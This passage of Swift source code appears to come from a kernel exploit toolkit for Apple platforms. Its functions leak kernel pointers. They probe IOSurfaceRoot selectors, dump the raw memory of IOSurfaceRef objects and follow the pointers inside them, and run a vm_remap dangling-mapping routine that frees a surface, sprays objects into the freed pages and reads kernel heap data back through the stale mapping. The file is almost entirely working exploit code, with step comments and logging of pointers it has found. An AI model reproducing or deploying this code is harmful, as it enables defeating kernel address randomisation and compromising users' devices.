            var input = Data(repeating: 0, count: 64)
            var output = Data(repeating: 0, count: 4096)
            var outSz = output.count
            let mkr = input.withUnsafeBytes { inBuf in
                output.withUnsafeMutableBytes { outBuf in
                    IOConnectCallStructMethod(conn, sel,
                                              inBuf.baseAddress, inBuf.count,
                                              outBuf.baseAddress, &outSz)
                }
            }
            if mkr == KERN_SUCCESS && outSz > 0 {
                totalScanned += outSz
                scanForKernelPointers(Data(output.prefix(outSz)), into: &candidates)
                if !candidates.isEmpty {
                    WireLog.shared.ok("IOSurfaceRoot struct sel=\(sel): \(candidates.count) ptrs in \(outSz)B")
                }
            }
        }

        IOServiceClose(conn)
        WireLog.shared.data("IOSurfaceRoot enum: \(totalScanned)B, \(candidates.count) ptrs")
        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - IOSurfaceRef object introspection (physmap KPTR from stage358)

    private static func isKernelPtr(_ v: UInt64) -> Bool {
        if v < 0xFFFFFFF000000000 { return false }
        if v == 0xFFFFFFFFFFFFFFFF || v == 0xFFFFFFFFFFFFFFFE { return false }
        if v == 0xFFFFFFFF00000000 || v == 0xFFFFFFF000000000 { return false }
        let top32 = UInt32(v >> 32)
        if top32 == 0xFFFFFFFF { return false }
        return true
    }

    private static func isPhysmapPtr(_ v: UInt64) -> Bool {
        let top8 = v >> 56
        return top8 == 0xFF && (v >> 32) >= 0xFFFFFFF0
    }

    private static func isUserspacePtr(_ v: UInt64) -> Bool {
        return v > 0x100000000 && v < 0x800000000000 && (v & 0x3) == 0
    }

    private static func tryIOSurfaceRefIntrospection() -> LeakResult {
        let log = WireLog.shared
        var candidates: [UInt64] = []
        var samples: [String] = []
        var totalScanned = 0

        log.data("IOSurfRef: creating probe surface")

        let props: [String: Any] = [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfacePixelFormat": 0x42475241
        ]
        guard let surface = IOSurfaceCreate(props as CFDictionary) else {
            log.warn("IOSurfRef: IOSurfaceCreate failed")
            return LeakResult(bytesScanned: 0, candidates: [])
        }

        let surfID = IOSurfaceGetID(surface)
        let surfBase = IOSurfaceGetBaseAddress(surface)
        let surfAlloc = IOSurfaceGetAllocSize(surface)
        log.data("IOSurfRef: id=\(surfID) base=\(surfBase) alloc=\(surfAlloc)")

        let refPtr = Unmanaged.passUnretained(surface).toOpaque()
        log.data("IOSurfRef: ref ptr=\(refPtr)")

        let refSize = 512
        let refBytes = UnsafeRawPointer(refPtr)

        log.data("IOSurfRef: === IOSurfaceRef raw dump (512B) ===")
        for off in stride(from: 0, to: refSize, by: 8) {
            let val = refBytes.load(fromByteOffset: off, as: UInt64.self)
            totalScanned += 8
            if val == 0 { continue }

            var tag = ""
            if isKernelPtr(val) {
                tag = " ★★★ KPTR"
                candidates.append(val)
                samples.append(String(format: "ref+0x%03x: 0x%016llx KPTR", off, val))
            } else if isPhysmapPtr(val) {
                tag = " ★★★ PHYSMAP"
                candidates.append(val)
                samples.append(String(format: "ref+0x%03x: 0x%016llx PHYSMAP", off, val))
            } else if isUserspacePtr(val) {
                tag = " (uptr)"
            }
            log.data(String(format: "  ref+0x%03x: 0x%016llx%@", off, val, tag))
        }

        log.data("IOSurfRef: === following internal uptr ivars ===")
        for off in stride(from: 0, to: min(refSize, 256), by: 8) {
            let val = refBytes.load(fromByteOffset: off, as: UInt64.self)
            guard isUserspacePtr(val) else { continue }

            let innerPtr = UnsafeRawPointer(bitPattern: UInt(val))
            guard let innerPtr = innerPtr else { continue }

            let canRead: Bool = {
                var info = vm_region_basic_info_data_64_t()
                var count = mach_msg_type_number_t(MemoryLayout<vm_region_basic_info_data_64_t>.size / MemoryLayout<Int32>.size)
                var regionAddr: vm_address_t = vm_address_t(val) & ~0x3FFF
                var regionSize: vm_size_t = 0
                var objectName: mach_port_t = 0
                let kr = withUnsafeMutablePointer(to: &info) { infoPtr in
                    infoPtr.withMemoryRebound(to: Int32.self, capacity: Int(count)) { intPtr in
                        vm_region_64(mach_task_self_,
                                     &regionAddr, &regionSize,
                                     VM_REGION_BASIC_INFO_64,
                                     intPtr, &count, &objectName)
                    }
                }
                return kr == KERN_SUCCESS && UInt64(regionAddr) <= val && (val + 256) <= UInt64(regionAddr) + UInt64(regionSize)
            }()
            guard canRead else { continue }

            log.data(String(format: "  ref+0x%03x → 0x%llx (inner struct, 256B):", off, val))

            for innerOff in stride(from: 0, to: 256, by: 8) {
                let innerVal = innerPtr.load(fromByteOffset: innerOff, as: UInt64.self)
                totalScanned += 8
                if innerVal == 0 { continue }

                var itag = ""
                if isKernelPtr(innerVal) {
                    itag = " ★★★ KPTR"
                    candidates.append(innerVal)
                    samples.append(String(format: "ref+0x%03x→+0x%03x: 0x%016llx KPTR", off, innerOff, innerVal))
                } else if isPhysmapPtr(innerVal) {
                    itag = " ★★★ PHYSMAP"
                    candidates.append(innerVal)
                    samples.append(String(format: "ref+0x%03x→+0x%03x: 0x%016llx PHYSMAP", off, innerOff, innerVal))
                }
                if !itag.isEmpty || innerOff < 128 {
                    log.data(String(format: "    +0x%03x: 0x%016llx%@", innerOff, innerVal, itag))
                }
            }
        }

        log.data("IOSurfRef: === sel6 struct output probe ===")
        var conn: io_connect_t = 0
        let matching = IOServiceMatching("IOSurfaceRoot")
        let service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
        if service != 0 {
            let kr = IOServiceOpen(service, mach_task_self_, 0, &conn)
            IOObjectRelease(service)
            if kr == KERN_SUCCESS && conn != 0 {
                var outBuf = [UInt8](repeating: 0, count: 4096)
                var outSz = outBuf.count
                let skr = IOConnectCallStructMethod(conn, 6,
                                                     [UInt8(surfID & 0xFF), UInt8((surfID >> 8) & 0xFF), 0, 0],
                                                     4, &outBuf, &outSz)
                if skr == KERN_SUCCESS && outSz > 0 {
                    log.data("IOSurfRef: sel6 returned \(outSz) bytes")
                    for off in stride(from: 0, to: min(outSz, 512), by: 8) {
                        guard off + 8 <= outSz else { break }
                        var val: UInt64 = 0
                        memcpy(&val, &outBuf[off], 8)
                        totalScanned += 8
                        if val == 0 { continue }
                        var stag = ""
                        if isKernelPtr(val) {
                            stag = " ★★★ KPTR"
                            candidates.append(val)
                            samples.append(String(format: "sel6+0x%03x: 0x%016llx KPTR", off, val))
                        } else if isPhysmapPtr(val) {
                            stag = " ★★★ PHYSMAP"
                            candidates.append(val)
                            samples.append(String(format: "sel6+0x%03x: 0x%016llx PHYSMAP", off, val))
                        }
                        if !stag.isEmpty || off < 128 {
                            log.data(String(format: "  sel6+0x%03x: 0x%016llx%@", off, val, stag))
                        }
                    }
                } else {
                    log.data("IOSurfRef: sel6 kr=0x\(String(format: "%x", skr)) outSz=\(outSz)")
                }
                IOServiceClose(conn)
            }
        }

        log.data(String(format: "IOSurfRef: total %dB scanned, %d candidates", totalScanned, candidates.count))
        return LeakResult(bytesScanned: totalScanned, candidates: candidates, samples: samples)
    }

    // MARK: - vm_remap dangling mapping (stage358 technique)
    //
    // 1. Create IOSurface → kernel allocates backing pages
    // 2. vm_remap(copy=false) → second VA maps same physical pages
    // 3. Release surface → kernel frees pages back to zone
    // 4. Spray objects → zone reuses pages with kernel data
    // 5. Read via remap → raw kernel heap contents (no API sanitization)

    private static func tryVMRemapDanglingLeak() -> LeakResult {
        let log = WireLog.shared
        var candidates: [UInt64] = []
        var samples: [String] = []
        var totalScanned = 0

        let trials = 20
        let sprayCount = 80

        for trial in 0..<trials {
            let props: [String: Any] = [
                "IOSurfaceWidth": 64,
                "IOSurfaceHeight": 64,
                "IOSurfaceBytesPerElement": 4,
                "IOSurfacePixelFormat": 0x42475241
            ]
            var surface: IOSurface? = IOSurfaceCreate(props as CFDictionary)
            guard let surf = surface else { continue }
            IOSurfaceLock(surf, .readOnly, nil)
            let basePtr = IOSurfaceGetBaseAddress(surf)
            let allocSz = IOSurfaceGetAllocSize(surf)
            let baseAddr = UInt(bitPattern: basePtr)
            IOSurfaceUnlock(surf, .readOnly, nil)

            var remapAddr: vm_address_t = 0
            var curProt: vm_prot_t = 0
            var maxProt: vm_prot_t = 0
            let remapSize = vm_size_t(allocSz)

            let rkr = vm_remap(
                mach_task_self_,
                &remapAddr,
                remapSize,
                0,
                1,
                mach_task_self_,
                vm_address_t(baseAddr),
                0,
                &curProt,
                &maxProt,
                1
            )

            guard rkr == KERN_SUCCESS else {
                if trial == 0 {
                    log.data("vm_remap: FAILED kr=0x\(String(format: "%x", rkr)) — may be blocked")
                }
                continue
            }

            if trial == 0 {
                log.data("vm_remap: trial 0 remap=0x\(String(format: "%lx", remapAddr)) alloc=\(allocSz) prot=\(curProt)/\(maxProt)")
            }

            let origFirst = UnsafeRawPointer(bitPattern: UInt(remapAddr))!
                .load(fromByteOffset: 0, as: UInt64.self)

            surface = nil
            usleep(5000)

            var fillSurfaces: [IOSurface] = []
            for _ in 0..<sprayCount {
                let fp: [String: Any] = [
                    "IOSurfaceWidth": 64,
                    "IOSurfaceHeight": 64,
                    "IOSurfaceBytesPerElement": 4,
                ]
                if let s = IOSurfaceCreate(fp as CFDictionary) {
                    fillSurfaces.append(s)
                }
            }

            var fillConns: [io_connect_t] = []
            let matching = IOServiceMatching("IOSurfaceRoot")
            if let matching = matching {
                let svc = IOServiceGetMatchingService(kIOMainPortDefault, matching)
                if svc != 0 {
                    for _ in 0..<sprayCount {
                        var c: io_connect_t = 0
                        if IOServiceOpen(svc, mach_task_self_, 0, &c) == KERN_SUCCESS && c != 0 {
                            fillConns.append(c)
                        }
                    }
                    IOObjectRelease(svc)
                }
            }

            usleep(5000)

            let remapPtr = UnsafeRawPointer(bitPattern: UInt(remapAddr))!
            let postFirst = remapPtr.load(fromByteOffset: 0, as: UInt64.self)
            let changed = postFirst != origFirst

            var trialHits = 0
            let scanLen = min(Int(allocSz), 16384)
            for off in stride(from: 0, to: scanLen, by: 8) {
                let v = remapPtr.load(fromByteOffset: off, as: UInt64.self)
                totalScanned += 8
                if v == 0 { continue }

                let isKptr = v > 0xFFFFFFF000000000 && v < 0xFFFFFFFFF0000000
                    && v != 0xFFFFFFFFFFFFFFFF && v != 0xFFFFFFFFFFFFFFFE
                    && v != 0xFFFFFFFF00000000
                let isPhys = (v >> 40) == 0xFFFFFF

                if isKptr || isPhys {
                    trialHits += 1
                    candidates.append(v)
                    let label = isPhys ? "PHYSMAP" : "KPTR"
                    samples.append(String(format: "vm_remap[%d]+0x%03x: 0x%016llx %@", trial, off, v, label))
                    if trialHits <= 4 {
                        log.data(String(format: "  vm_remap[%d]+0x%03x: 0x%016llx ★ %@", trial, off, v, label))
                    }
                }
            }

            if trial < 3 || trialHits > 0 {
                log.data("vm_remap trial \(trial): changed=\(changed) hits=\(trialHits)")
            }

            fillSurfaces.removeAll()
            for c in fillConns { IOServiceClose(c) }
            vm_deallocate(mach_task_self_, remapAddr, remapSize)

            if trialHits > 0 {
                log.ok("★★★ vm_remap trial \(trial): \(trialHits) kernel pointers from dangling mapping!")
                break
            }
        }

        return LeakResult(bytesScanned: totalScanned, candidates: candidates, samples: samples)
    }
}

extension Data {
    mutating func appendLE(_ v: UInt16) {
        Swift.withUnsafeBytes(of: v.littleEndian) { append(contentsOf: $0) }
    }
    mutating func appendLE(_ v: UInt32) {
        Swift.withUnsafeBytes(of: v.littleEndian) { append(contentsOf: $0) }
    }
}
